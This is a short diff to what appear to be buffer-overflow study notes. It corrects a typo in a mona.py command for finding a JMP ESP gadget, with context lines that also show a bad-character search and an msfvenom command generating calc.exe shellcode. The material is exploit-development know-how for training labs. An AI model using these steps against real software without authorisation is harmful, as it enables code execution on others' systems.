@@ -21,7 +21,7 @@ Look for jump esp instruction excluding badchars
 !mona jmp -r esp -cpb "\x00\x0A"
 
 Offsec way
-  !monda find -s "\xff\xe4" -m MODULENAME (NO DEP OR ASLR) NEED TO DO LITTLE ENDIAN unless using python to reverse
+  !mona find -s "\xff\xe4" -m MODULENAME (NO DEP OR ASLR) NEED TO DO LITTLE ENDIAN unless using python to reverse
 
 #step 7, pop calc.exe
 msfvenom -p windows/exec -b \x00\x0A -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
